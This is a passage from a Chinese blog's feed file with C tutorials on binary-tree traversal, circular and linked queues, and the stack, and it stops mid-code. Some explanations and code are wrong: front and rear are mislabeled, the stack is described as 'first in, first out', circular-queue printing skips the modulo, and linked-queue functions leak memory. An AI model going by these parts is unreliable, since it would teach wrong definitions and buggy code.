class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">visit</span><span class="params">(TElemType e)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, e);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>主函数的实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">BiTree T;</span><br><span class="line">CreateBiTree(T);</span><br><span class="line">        <span class="comment">//先序遍历</span></span><br><span class="line">PreorderTraverse(T, *visit);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="comment">//中序遍历</span></span><br><span class="line">InorderTraverse1(T, *visit);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="comment">//后序遍历</span></span><br><span class="line">PostorderTraverse(T, *visit);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>结果展示</strong></p></li></ol><ul><li><p>INPUT</p><blockquote><p>AB#C##DE###</p></blockquote></li><li><p>OUTPUT</p><blockquote><p>A B C D E<br>B C A E D<br>C B E D A</p></blockquote></li></ul><h3 id="二叉树完整代码地址"><a href="#二叉树完整代码地址" class="headerlink" title="二叉树完整代码地址"></a><a href="http:\\chalnl.com\code\BiTree.cpp">二叉树完整代码地址</a></h3>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之队列 - Queue</title>
      <link href="/post/d4b6632d.html/"/>
      <url>/post/d4b6632d.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列(Queue)"></a>队列(Queue)</h1><h2 id="队列基础知识"><a href="#队列基础知识" class="headerlink" title="队列基础知识"></a>队列基础知识</h2><h3 id="队列介绍"><a href="#队列介绍" class="headerlink" title="队列介绍"></a>队列介绍</h3><blockquote><p>队列是<strong>线性表</strong>的一种，在操作数据元素时，和栈一样，有自己的规则：使用队列存取数据元素时，数据元素<strong>只能从表的一端进入队列，另一端出队列</strong></p></blockquote><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6tdze1atdj30mn05ggm3.jpg"/></div><blockquote><p>进入队列的一端为“<strong>队尾 - front</strong>”；出队列的一端为“<strong>队头 - rear</strong>”。数据元素全部由<strong>队尾陆续进队列</strong>，由<strong>队头陆续出队列</strong>。</p></blockquote><h3 id="先进先出原则"><a href="#先进先出原则" class="headerlink" title="先进先出原则"></a>先进先出原则</h3><ul><li>队列从一端存入数据，另一端调取数据的原则称为“先进先出”原则。</li></ul><blockquote><p>根据队列的先进先出原则，（a1,a2,a3,…,an）中，由于 a1 最先从队尾进入队列，所以可以最先从队头出队列，对于 a2 来说，只有 a1 出队之后，a2 才能出队</p></blockquote><h3 id="队列的实现方式"><a href="#队列的实现方式" class="headerlink" title="队列的实现方式"></a>队列的实现方式</h3><ul><li>队列的实现同样有两种方式：<strong>顺序存储</strong>和<strong>链式存储</strong>。</li></ul><blockquote><p>两者的区别同样在于数据元素在物理<strong>存储结构</strong>上的<strong>不同</strong>。</p></blockquote><hr><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">循环队列代码实现 - SqQueue</button></li><li class="tab"><button type="button" data-href="#-2">链式队列代码实现 - LinkQueue</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><h2 id="循环队列代码实现-SqQueue"><a href="#循环队列代码实现-SqQueue" class="headerlink" title="循环队列代码实现 - SqQueue"></a>循环队列代码实现 - SqQueue</h2><div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6vmyd89wzj30wr0f6dhr.jpg></div><ul><li>队列的第一位元素与最后一位元素 <code>Q.front = (Q.front + 1) % MAXQSIZE</code> 形成循环</li></ul><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">QElemType* base; <span class="comment">//数据存放</span></span><br><span class="line"><span class="type">int</span> front;       <span class="comment">//头指针，指向队列头元素</span></span><br><span class="line"><span class="type">int</span> rear;        <span class="comment">//尾指针，指向队列尾元素下一个位置</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure></li><li><p>初始化队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitQueue</span><span class="params">(SqQueue&amp; Q)</span> &#123;</span><br><span class="line"><span class="comment">//申请队列结点空间 100</span></span><br><span class="line">Q.base = (QElemType*)<span class="built_in">malloc</span>(MAXQSIZE * <span class="keyword">sizeof</span>(QElemType));</span><br><span class="line"><span class="keyword">if</span> (!Q.base)</span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">Q.front = Q.rear = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>循环队列中元素入列<br><div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6vn2ibsx3j30k00drq3z.jpg></div></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(SqQueue&amp; Q, QElemType e)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((Q.rear + <span class="number">1</span>) % MAXQSIZE == Q.front) <span class="comment">//判断是否队满</span></span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">Q.base[Q.rear] = e;                     <span class="comment">//将e赋下一个空节点</span></span><br><span class="line">Q.rear = (Q.rear + <span class="number">1</span>) % MAXQSIZE;       <span class="comment">//尾结点往后指一位</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>循环队列中元素出列<br><div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6vov2r74zj30ip0dkwfk.jpg></div></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(SqQueue&amp; Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front == Q.rear)     <span class="comment">//判断队列是否为空</span></span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">Q.front = (Q.front + <span class="number">1</span>) % MAXQSIZE;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>计算循环队列长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span><span class="params">(SqQueue Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (Q.rear - Q.front + MAXQSIZE) % MAXQSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出循环队列数据元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PrintQueue</span><span class="params">(SqQueue Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front == Q.rear)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line"><span class="type">int</span> n = QueueLength(Q);      <span class="comment">//循环链表数据长度</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqQueue is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)  <span class="comment">//循环输出顺序队列数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,Q.base[Q.front+i]);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>循环队列主函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, e;</span><br><span class="line"><span class="type">char</span> chr;</span><br><span class="line">SqQueue Q;</span><br><span class="line">InitQueue(Q);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the SqQueue:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the SqQueue:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">EnQueue(Q, e);</span><br><span class="line">&#125;</span><br><span class="line">PrintQueue(Q);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWhether delete the front of the QNode:(y/n)\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;chr);</span><br><span class="line"><span class="keyword">if</span> (chr == <span class="string">&#x27;y&#x27;</span> || chr == <span class="string">&#x27;Y&#x27;</span>) </span><br><span class="line">DeQueue(Q);</span><br><span class="line">PrintQueue(Q);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>循环队列结果展示<div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6uowddjv2j30de05jacb.jpg></div></li></ul><h3 id="SqQueue-完整代码地址"><a href="#SqQueue-完整代码地址" class="headerlink" title="SqQueue 完整代码地址"></a><a href="http:\\chalnl.com\code\SqQueue.cpp">SqQueue 完整代码地址</a></h3><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><h2 id="链式队列代码实现-LinkQueue"><a href="#链式队列代码实现-LinkQueue" class="headerlink" title="链式队列代码实现 - LinkQueue"></a>链式队列代码实现 - LinkQueue</h2><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> &#123;</span>        <span class="comment">//结点定义</span></span><br><span class="line">QElemType data;       <span class="comment">//数据存放</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>* <span class="title">next</span>;</span>   <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;QNode, * QueuePtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>              <span class="comment">//指针定义</span></span><br><span class="line">QueuePtr front;       <span class="comment">//头指针</span></span><br><span class="line">QueuePtr rear;        <span class="comment">//尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure></li><li><p>初始化队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitQueue</span><span class="params">(LinkQueue&amp; Q)</span> &#123;</span><br><span class="line">        <span class="comment">//申请队列结点空间</span></span><br><span class="line">Q.front = Q.rear = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line"><span class="keyword">if</span> (!Q.front)           <span class="comment">//申请失败</span></span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">Q.front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>链式队列中元素入列<br><div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6umejwy6nj30k105kdgg.jpg></div></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(LinkQueue&amp; Q, QElemType e)</span> &#123;</span><br><span class="line">QueuePtr p= (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">Q.rear-&gt;next = p;</span><br><span class="line">Q.rear = p;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>链式队列中元素出列<br><div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6umibregsj30k905vwfj.jpg></div></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(LinkQueue&amp; Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front == Q.rear)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">QueuePtr p = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line">p = Q.front-&gt;next; </span><br><span class="line">Q.front-&gt;next = p-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (Q.rear == p)</span><br><span class="line">Q.rear = Q.front;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>销毁队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DestroyQueue</span><span class="params">(LinkQueue&amp; Q)</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (Q.front) &#123;</span><br><span class="line">Q.rear = Q.front-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(Q.front);</span><br><span class="line">Q.front = Q.rear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>链式队列元素的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PrintQueue</span><span class="params">(LinkQueue&amp; Q)</span>&#123;</span><br><span class="line">QueuePtr p = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line"><span class="keyword">if</span> (Q.front == Q.rear)</span><br><span class="line"><span class="keyword">return</span> OVERFLOW;</span><br><span class="line">p = Q.front-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The LinkQueue is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (p != Q.rear-&gt;next) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>链式队列主函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n,e;</span><br><span class="line"><span class="type">char</span> chr;</span><br><span class="line">LinkQueue Q;</span><br><span class="line">InitQueue(Q);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the LinkQueue:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the LinkQueue:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">EnQueue(Q, e);</span><br><span class="line">&#125;</span><br><span class="line">PrintQueue(Q);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWhether delete the front of the QNode:(y/n)\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;chr);</span><br><span class="line"><span class="keyword">if</span> (chr == <span class="string">&#x27;y&#x27;</span> || chr == <span class="string">&#x27;Y&#x27;</span>) </span><br><span class="line">DeQueue(Q);</span><br><span class="line">PrintQueue(Q);</span><br><span class="line">DestroyQueue(Q);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>链式队列结果展示<div align=center><img src=https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6tfz6wb2mj30dh05njtb.jpg></div></li></ul><h3 id="LinkQueue-完整代码地址"><a href="#LinkQueue-完整代码地址" class="headerlink" title="LinkQueue 完整代码地址"></a><a href="http:\\chalnl.com\code\LinkQueue.cpp">LinkQueue 完整代码地址</a></h3><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之栈 - Stack</title>
      <link href="/post/87c7e7d.html/"/>
      <url>/post/87c7e7d.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈(Stack)"></a>栈(Stack)</h1><h2 id="栈的基础知识"><a href="#栈的基础知识" class="headerlink" title="栈的基础知识"></a>栈的基础知识</h2><ul><li>栈是一种“特殊”的<strong>线性存储结构</strong></li></ul><ol><li><p>元素<strong>进栈和出栈</strong>的操作<strong>只能从一端完成</strong>，另一端是封闭的。元素进栈的过程简称为“入栈”、“进栈”或者“压栈”；将元素出栈的过程简称为“出栈”或者“弹栈”</p><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6pmzbd7fcj30ci01pq2z.jpg"/></div></li><li><p>栈中存数据和取数据，都遵循“<strong>先进后出</strong>”的原则，即最先入栈的元素最先出栈。<br>栈的开口端称为<strong>栈顶</strong>，封口端称为<strong>栈底</strong>。</p><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h6pn0ntdd3j303y06yjrf.jpg"/></div></li></ol><h2 id="顺序栈代码实现"><a href="#顺序栈代码实现" class="headerlink" title="顺序栈代码实现"></a>顺序栈代码实现</h2><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">SElemType* top;      <span class="comment">//头指针，指向栈顶的上一个元素</span></span><br><span class="line">SElemType* base;     <span class="comment">//尾指针，指向栈底</span></span><br><span class="line"><span class="type">int</span> stacksize;       <span class="comment">//内存空间</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure></li><li><p>初始化栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Initstack</span><span class="params">(SqStack&amp; s)</span> &#123;</span><br><span class="line">s.base = (SElemType*)<span class="built_in">malloc</span>(STACK_INIT_SIZE * <span class="keyword">sizeof</span>(SElemType)); </span><br><span class="line"><span class="keyword">if</span> (!s.base) </span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">s.top = s.base;        </span><br><span class="line">s.stacksize = STACK_INIT_SIZE; </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>进栈操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack&amp; s, SElemType e)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (s.top - s.base &gt;= s.stacksize)&#123;  <span class="comment">//满栈，增加内存空间</span></span><br><span class="line">s.base = (SElemType*)<span class="built_in">realloc</span>(s.base,(s.stacksize + STACKINCREMENT) * <span class="keyword">sizeof</span>(SElemType) ) ;</span><br><span class="line"><span class="keyword">if</span> (!s.base) </span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW); </span><br><span class="line">s.top = s.base + s.stacksize; </span><br><span class="line">s.stacksize += STACKINCREMENT; </span><br><span class="line">&#125;</span><br><span class="line">* s.top++ = e;           <span class="comment">//*s.top=e --&gt; *s.top++</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>出栈操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack&amp; s)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (s.top == s.base)     <span class="comment">//判断是否为空栈</span></span><br><span class="line"><span class="keyword">return</span> ERROR; </span><br><span class="line">s.top--;</span><br><span class="line"><span class="comment">//printf(&quot;%d &quot;, * --s.top);</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>判断是否为空栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (S.base == S.top) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqStack is Empty\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqStack is not Empty\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出栈中的元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">StackTraverse</span><span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">SElemType* p = S.top;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqStack is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (p &gt; S.base) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *--p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将十进制数转换为八进制数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">conversion</span><span class="params">()</span> &#123;</span><br><span class="line">SqStack Sq;</span><br><span class="line">Initstack(Sq);</span><br><span class="line"><span class="type">int</span> N;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line"><span class="keyword">while</span> (N) &#123;</span><br><span class="line">Push(Sq,N % <span class="number">8</span>);</span><br><span class="line">N = N / <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The octal number is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (Sq.top &gt; Sq.base) </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *--Sq.top);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>主函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 